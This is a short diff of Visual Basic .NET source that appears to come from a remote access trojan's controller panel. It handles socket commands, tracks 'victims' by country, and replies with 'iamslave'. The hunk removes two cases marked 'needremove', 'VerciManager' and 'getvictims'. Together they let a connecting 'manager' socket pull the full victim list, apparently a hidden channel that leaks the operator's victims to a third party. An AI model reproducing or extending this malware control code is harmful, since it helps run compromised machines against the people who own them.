@@ -316,21 +316,6 @@ Public Class Main
                     Dim BB As Byte() = fx(B, "@@" & Yy)(1)
 
 
-                Case "VerciManager" 'needremove
-                    Dim L = ListView1.Items.Add(sock.ToString, A(0), 241) 'name + country 
-
-
-                    L.ToolTipText = sock
-
-                    S.Send(sock, "iamslave")
-
-                Case "getvictims" 'needremove
-
-                    For ix As Integer = 0 To L1.Items.Count - 1
-                        S.Send(sock, "victim" & Yy & L1.Items(ix).SubItems(0).Text & Yy & L1.Items(ix).SubItems(1).Text & Yy & L1.Items(ix).SubItems(2).Text & Yy & L1.Items(ix).SubItems(3).Text & Yy & L1.Items(ix).SubItems(4).Text & Yy & L1.Items(ix).SubItems(5).Text & Yy & L1.Items(ix).SubItems(6).Text & Yy & L1.Items(ix).SubItems(7).Text & Yy & L1.Items(ix).SubItems(8).Text & Yy & L1.Items(ix).SubItems(9).Text)
-                    Next
-
-              
  
 
                 Case "infoDesk"
